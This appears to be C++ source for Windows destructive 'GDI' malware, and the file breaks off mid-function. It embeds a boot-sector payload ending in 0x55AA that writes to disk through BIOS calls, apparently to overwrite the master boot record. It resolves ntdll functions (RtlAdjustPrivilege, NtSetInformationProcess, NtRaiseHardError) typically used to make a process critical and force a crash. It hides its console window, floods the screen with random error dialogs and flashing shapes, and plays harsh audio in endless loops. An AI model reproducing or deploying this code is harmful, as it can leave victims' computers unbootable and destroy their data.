// grapflas.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(lib, "winmm.lib")
#include <iostream>
#include <Windows.h>
unsigned char data[2048] = {
	0x88, 0x16, 0x3A, 0x7D, 0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x16, 0x02, 0xB9, 0x03,
	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3, 0x89, 0xC1, 0x89, 0xC2,
	0xBE, 0x00, 0x00, 0xBF, 0xA0, 0x00, 0xAC, 0x81, 0xFE, 0xA0, 0x00, 0x73, 0x31, 0x3C, 0x80, 0x73,
	0x02, 0xEB, 0x0F, 0x24, 0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75, 0xF7,
	0xEB, 0xE4, 0xB4, 0x00, 0x3C, 0x40, 0x72, 0x05, 0x24, 0x3F, 0x88, 0xC4, 0xAC, 0x89, 0xC1, 0xAD,
	0x89, 0xF2, 0x89, 0xFE, 0x29, 0xC6, 0xAC, 0xAA, 0xE2, 0xFC, 0x89, 0xD6, 0xEB, 0xC8, 0xB8, 0x13,
	0x00, 0xCD, 0x10, 0xBB, 0xE0, 0x07, 0x8E, 0xDB, 0xBE, 0xA0, 0x00, 0xB4, 0x00, 0xAC, 0xBB, 0x00,
	0x00, 0x89, 0xC1, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0x43, 0xBA, 0xC9, 0x03, 0xAC, 0xEE, 0xAC,
	0xEE, 0xAC, 0xEE, 0xE2, 0xEE, 0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xBF, 0x00, 0x00, 0xB9, 0x00, 0x7D,
	0xF3, 0xA5, 0xB4, 0x86, 0xB9, 0x32, 0x00, 0xCD, 0x15, 0xB4, 0x00, 0x80, 0xFC, 0x00, 0x75, 0xF2,
	0x30, 0xE4, 0xCD, 0x16, 0x80, 0xFC, 0x01, 0x75, 0xE9, 0xB4, 0x02, 0xCD, 0x16, 0x24, 0x0F, 0x3C,
	0x0C, 0x75, 0xDF, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xBB, 0x00,
	0x4F, 0x8A, 0x16, 0x3A, 0x7D, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x02, 0xB0, 0x01, 0xB4, 0x02, 0xCD,
	0x13, 0xBB, 0x00, 0x4F, 0x8A, 0x16, 0x3A, 0x7D, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x01, 0xB0, 0x02,
	0xB4, 0x03, 0xCD, 0x13, 0xBB, 0x00, 0x4F, 0x8A, 0x16, 0x3A, 0x7D, 0xB6, 0x00, 0xB5, 0x00, 0xB1,
	0x02, 0xB0, 0x01, 0xB4, 0x02, 0xCD, 0x13, 0xC6, 0x06, 0x3E, 0x7D, 0x03, 0xBB, 0x00, 0x4F, 0x8A,
	0x16, 0x3A, 0x7D, 0x8A, 0x0E, 0x3E, 0x7D, 0xB0, 0x01, 0xB4, 0x03, 0xCD, 0x13, 0xFE, 0x06, 0x3E,
	0x7D, 0x80, 0x3E, 0x3E, 0x7D, 0x41, 0x75, 0xE4, 0x31, 0xC0, 0x8E, 0xC0, 0xBB, 0xD2, 0x04, 0x26,
	0x89, 0x1E, 0xD8, 0x01, 0xFA, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0x89, 0xC4, 0xB8, 0x02, 0x00,
	0x50, 0xB8, 0x00, 0xF0, 0x50, 0xB8, 0xF0, 0xFF, 0x50, 0xCF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x8A, 0x04, 0x00, 0x00, 0x3F, 0x3F, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x3F, 0x05, 0x08, 0x00, 0x80,
	0x00, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x10, 0x10, 0x00, 0x20, 0x20, 0x00, 0x40, 0x40, 0x40,
	0x00, 0x20, 0x20, 0x00, 0x83, 0x01, 0x01, 0x01, 0x01, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x10,
	0x10, 0x00, 0x20, 0x20, 0x00, 0x40, 0x40, 0x40, 0x00, 0x20, 0x20, 0x00, 0x41, 0x40, 0x40, 0x01,
	0x42, 0x80, 0x80, 0x02, 0x45, 0x00, 0x00, 0x05, 0x4A, 0x00, 0x00, 0x0A, 0x54, 0x00, 0x00, 0x14,
	0x68, 0x00, 0x00, 0x28, 0x6D, 0xA0, 0x40, 0x2E, 0x83, 0x02, 0x02, 0x02, 0x02, 0x04, 0x04, 0x00,
	0x08, 0x08, 0x00, 0x10, 0x10, 0x00, 0x20, 0x20, 0x00, 0x11, 0x11, 0x00, 0x41, 0x40, 0x40, 0x01,
	0x83, 0x03, 0x03, 0x03, 0x03, 0x04, 0x04, 0x00, 0x08, 0x08, 0x00, 0x10, 0x10, 0x00, 0x20, 0x20,
	0x00, 0x0F, 0x0F, 0x00, 0x41, 0x40, 0x40, 0x01, 0x42, 0x80, 0x80, 0x02, 0x45, 0x00, 0x00, 0x05,
	0x4A, 0x00, 0x00, 0x0A, 0x54, 0x00, 0x00, 0x14, 0x68, 0x00, 0x00, 0x28, 0x6C, 0x60, 0x00, 0x2D,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
typedef void(AUDIO_SEQUENCE)(int nSamplesPerSec, int nSampleCount, PSHORT psSamples), * PAUDIO_SEQUENCE;
typedef struct tagAUDIO_SEQUENCE_PARAMS 
{
	int nSamplesPerSec;
	int nSampleCount;
	PAUDIO_SEQUENCE pAudioSequence;
} AUDIO_SEQUENCE_PARAMS, * PAUDIO_SEQUENCE_PARAMS;
typedef struct winfo
{
	HWND hwnd;
	HDC hdc;
	RECT rekt;
};
HMODULE ntdll = LoadLibraryA("ntdll");
FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
FARPROC NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");
FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
BOOL sW = TRUE;
winfo GetDesktopWinfo()
{
	winfo dwi;
	dwi.hwnd = GetDesktopWindow();
	dwi.hdc = GetWindowDC(dwi.hwnd);
	GetWindowRect(dwi.hwnd, &(dwi.rekt));
	return dwi;
}
void notemsg()
{
	int a,b;
	wchar_t *str1,*str2;
	HCRYPTPROV prov;
	a = rand() % 256 + 1;
	b = rand() % 16 + 1;
	str1=(wchar_t*)malloc(a);
	str2=(wchar_t*)malloc(b);
	CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
	CryptGenRandom(prov, a, (BYTE*)str1);
	CryptGenRandom(prov, b, (BYTE*)str2);
	Sleep(rand()%3000+1);
	MessageBox(NULL, str1, str2, MB_ICONERROR | MB_ABORTRETRYIGNORE | MB_SYSTEMMODAL);
}
void DrawCursorIcos()
{
	int i, j;
	int ix;
	int iy;
	POINT cursor;
	winfo wi;
	LPWSTR idico[4] = { IDI_ERROR,IDI_QUESTION,IDI_WARNING,IDI_INFORMATION };
	for (i = 0; i <= 3; i++)
	{
		for (j = 1; j <= 10; j++)
		{
			wi = GetDesktopWinfo();
			ix = GetSystemMetrics(SM_CXICON) / 2;
			iy = GetSystemMetrics(SM_CYICON) / 2;
			GetCursorPos(&cursor);
			DrawIcon(wi.hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, idico[i]));
			Sleep(100);
		}
		if (i == 3)i = -1;
	}
}
void DrawGraphicsRound(int x, int y, int radius)
{
	double numIcons = (2 * 3.14159265359 * radius) / 31;
	double angleIncrement = 2 * 3.14159265359 / numIcons; // 计算每个图标之间的角度增量
	double angle = 0; // 初始角度
	winfo wi = GetDesktopWinfo();
	for (int i = 0; i < numIcons; i++)
	{
		// 计算图标的位置
		int iconX = x + (int)(radius * cos(angle));
		int iconY = y + (int)(radius * sin(angle));
		if (iconX > (wi.rekt).left && iconX<(wi.rekt).right && iconY>(wi.rekt).top && iconY < (wi.rekt).bottom)DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_ERROR));
		angle += angleIncrement;
	}
}
void DrawIcoTriangle(int centerX, int centerY, int base, int height)
{
	// 计算三角形的斜边长
	double hypotenuse = sqrt(base * base + height * height);
	int iconSpacing = (hypotenuse * 2 + base) / 31;
	// 计算图标之间的间距对应的角度
	double iconSpacingAngle = atan(iconSpacing / hypotenuse);

	// 计算三角形的角度
	double angle1 = atan2(height, base);
	double angle2 = atan2(height, base);

	// 计算图标数量
	int numIcons1 = (int)((hypotenuse * cos(angle1)) / iconSpacing) + 1;
	int numIcons2 = (int)((hypotenuse * cos(angle2)) / iconSpacing) + 1;
	int numIcons3 = (int)((double)base / iconSpacing) + 1;
	// 绘制第一条边的图标
	winfo wi = GetDesktopWinfo();
	for (int i = 0; i < numIcons1; i++)
	{
		int iconX = centerX + (int)(i * iconSpacing * cos(angle1));
		int iconY = centerY + (int)(i * iconSpacing * sin(angle1));
		if (iconX > (wi.rekt).left && iconX<(wi.rekt).right && iconY>(wi.rekt).top && iconY < (wi.rekt).bottom)DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_WARNING));
	}
	// 绘制第二条边的图标
	for (int i = 0; i < numIcons2; i++)
	{
		int iconX = centerX - (int)(i * iconSpacing * cos(angle2));
		int iconY = centerY + (int)(i * iconSpacing * sin(angle2));
		if (iconX > (wi.rekt).left && iconX<(wi.rekt).right && iconY>(wi.rekt).top && iconY < (wi.rekt).bottom)DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_WARNING));
	}
	// 绘制底边的图标
	for (int i = 0; i < numIcons3; i++)
	{
		int iconX = centerX - base / 2 + i * iconSpacing;
		int iconY = centerY + height / 2;
		if (iconX > (wi.rekt).left && iconX<(wi.rekt).right && iconY>(wi.rekt).top && iconY < (wi.rekt).bottom)DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_WARNING));
	}
}
void DrawIconRectangle(int topLeftX, int topLeftY, int bottomRightX, int bottomRightY)
{
	// 计算矩形的宽度和高度
	int width = bottomRightX - topLeftX;
	int height = bottomRightY - topLeftY;
	int iconSpacing = 31;
	// 计算矩形的图标数量
	int numIconsWidth = width / iconSpacing + 1;
	int numIconsHeight = height / iconSpacing + 1;
	winfo wi = GetDesktopWinfo();
	// 绘制上边的图标
	for (int i = 0; i < numIconsWidth; i++)
	{
		int iconX = topLeftX + i * iconSpacing;
		int iconY = topLeftY;
		DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_INFORMATION));
	}

	// 绘制右边的图标
	for (int i = 0; i < numIconsHeight; i++)
	{
		int iconX = bottomRightX;
		int iconY = topLeftY + i * iconSpacing;
		DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_INFORMATION));
	}

	// 绘制下边的图标
	for (int i = 0; i < numIconsWidth; i++)
	{
		int iconX = bottomRightX - i * iconSpacing;
		int iconY = bottomRightY;
		DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_INFORMATION));
	}

	// 绘制左边的图标
	for (int i = 0; i < numIconsHeight; i++)
	{
		int iconX = topLeftX;
		int iconY = bottomRightY - i * iconSpacing;
		DrawIcon(wi.hdc, iconX, iconY, LoadIcon(NULL, IDI_INFORMATION));
	}
}
void PayloadIcoGraphics()
{
	int x, y;
	winfo wi;
	wi = GetDesktopWinfo();
	for (;;)
	{
		x = rand() % (wi.rekt).right + (wi.rekt).left;
		y = rand() % (wi.rekt).bottom + (wi.rekt).top;
		switch (rand() % 3 + 1)
		{
		case 1:DrawGraphicsRound(x, y, (rand() % (wi.rekt).bottom + (wi.rekt).top) / 2 / 2); break;
		case 2:DrawIcoTriangle(x, y, (rand() % (wi.rekt).right + (wi.rekt).left) / 2, (rand() % (wi.rekt).bottom + (wi.rekt).top) / 2); break;
		case 3:DrawIconRectangle(x, y, x + rand() % (wi.rekt).right + (wi.rekt).left, y + rand() % (wi.rekt).bottom + (wi.rekt).top); break;
		}
		if (!sW)break;
		Sleep(rand()%1500+1);
	}
}
void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence)
{
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount * 2);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

	Sleep(nSampleCount * 1000 / nSamplesPerSec);

	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
void ExecuteAudioSequenceParams(PAUDIO_SEQUENCE_PARAMS pAudioParams)
{
	ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence);
}
void AudioNote(int nSamplesPerSec, int nSampleCount, PSHORT psSamples)
{
	for (INT t = 0; t < nSampleCount * 2; t++) 
	{
		BYTE bFreq = (BYTE)(t / 91 & t ^ t / 90 & t) - ((t & t >> 12) * t >> 12);
		((BYTE*)psSamples)[t] = bFreq;
	}
}
void AudioSequence1(int nSamplesPerSec, int nSampleCount, PSHORT psSamples)
{
	for (INT t = 0; t < nSampleCount * 2; t++) 
	{
		BYTE bFreq = (BYTE)(t << (t >> 12 & t >> 8 * 2) * 231);
		((BYTE*)psSamples)[t] = bFreq;
	}
}
void AudioSequence2(int nSamplesPerSec, int nSampleCount, PSHORT psSamples)
{
	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)9 * (t * ((t >> 9 | t >> 13) & 15) & 16);
		((BYTE*)psSamples)[t] = bFreq;
	}
}
void AudioSequence3(int nSamplesPerSec, int nSampleCount, PSHORT psSamples)
{
	for (INT t = 0; t < nSampleCount * 2; t++)
	{
		BYTE bFreq = (BYTE)t * (t >> 5 | t >> 8) >> (t >> 16) + ((t & (t >> 9 | t >> 13)) * t >> 13);
		((BYTE*)psSamples)[t] = bFreq;
	}
}
void AudioNoteThread()
{
	AUDIO_SEQUENCE_PARAMS a;
	Sleep(rand() % 3000 + 1);
	a = { 30100, 30100, AudioNote };
	ExecuteAudioSequenceParams(&a);
}
void AudioPayload1Thread()
{
	AUDIO_SEQUENCE_PARAMS a;
	a = { 8000, 8000 * 40, AudioSequence1 };
	ExecuteAudioSequenceParams(&a);
}
void AudioPayload2Thread()
{
	AUDIO_SEQUENCE_PARAMS a;
	a = { 8000, 8000 * 60, AudioSequence2 };
	ExecuteAudioSequenceParams(&a);
}
void AudioPayload3Thread()
{
	AUDIO_SEQUENCE_PARAMS a;
	a = { 32000, 32000 * 30, AudioSequence3 };
	ExecuteAudioSequenceParams(&a);
}
void PayloadBuzz()
{
	for (;;)Beep(rand() % 0x7FFF + 0x25, rand() % 1500 + 1);
}
void FlaRec(HDC hdc, RECT rect)
{
	int i;
	HPEN hPen;
	HBRUSH hBrush;
	int x = rand() % rect.right;
	int y = rand() % rect.bottom;
	int width = rand() % (rect.right / 2);
	int height = rand() % (rect.bottom / 2);
	hPen = CreatePen(PS_NULL, NULL, NULL);
	SelectObject(hdc, hPen);
	for (i = 1; i <= 20; i++)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, hBrush);
		Rectangle(hdc, x, y, x + width, y + height);
		DeleteObject(hBrush);
		Sleep(10);
	}
}
void FlaEll(HDC hdc, RECT rect)
{
	int i;
	HPEN hPen;
	HBRUSH hBrush;
	int x = rand() % rect.right;
	int y = rand() % rect.bottom;
	int width = rand() % (rect.right / 2);
	int height = rand() % (rect.bottom / 2);
	hPen = CreatePen(PS_NULL, NULL, NULL);
	SelectObject(hdc, hPen);
	for (i = 1; i <= 20; i++)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, hBrush);
		Ellipse(hdc, x, y, x + width, y + height);
		DeleteObject(hBrush);
		Sleep(10);
	}
}
void FlaRou(HDC hdc, RECT rect)
{
	int i;
	HPEN hPen;
	HBRUSH hBrush;
	int x = rand() % rect.right;
	int y = rand() % rect.bottom;
	int width = rand() % (rect.right / 2);
	int height = rand() % (rect.bottom / 2);
	hPen = CreatePen(PS_NULL, NULL, NULL);
	SelectObject(hdc, hPen);
	for (i = 1; i <= 20; i++)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, hBrush);
		RoundRect(hdc, x, y, x + width, y + height, 20, 20);
		DeleteObject(hBrush);
		Sleep(10);
	}
}
void PayloadDrawRandomShape()
{
	winfo w = GetDesktopWinfo();
	switch (rand() % 3)
	{
	case 0:FlaRec(w.hdc, w.rekt); break;
	case 1:FlaEll(w.hdc, w.rekt); break;
	case 2:FlaRou(w.hdc, w.rekt); break;
	}
	ReleaseDC(w.hwnd,w.hdc);
}
void DrawRandomShapeThread()
{
	for (;;)
	{
		PayloadDrawRandomShape();
		if (sW)Sleep(rand() % 1500 + 1);
		else break;
	}
}
void PayloadStripe()
{
	int i;
	int x, y;
	int width, high;
	winfo wi;
	HPEN hPen;
	HBRUSH hBrush;
	wi = GetDesktopWinfo();
	hPen = CreatePen(PS_NULL, NULL, NULL);
	SelectObject(wi.hdc, hPen);
	width = ((wi.rekt).right - (wi.rekt).left) / 10;
	x = (wi.rekt).left;
	for (i = 1; i <= 10; i++)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(wi.hdc, hBrush);
		if (i == 10)Rectangle(wi.hdc, x - 1, (wi.rekt).top, (wi.rekt).right, (wi.rekt).bottom);
		else Rectangle(wi.hdc, x - 1, (wi.rekt).top, x + width, (wi.rekt).bottom);
		DeleteObject(hBrush);
		x += width;
		Sleep(100);
	}
	Sleep(300);
	high = ((wi.rekt).bottom - (wi.rekt).top) / 10;
	y = (wi.rekt).top;
	for (i = 1; i <= 10; i++)
	{
		hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(wi.hdc, hBrush);
		if (i == 10)Rectangle(wi.hdc, (wi.rekt).left, y - 1, (wi.rekt).right, (wi.rekt).bottom);
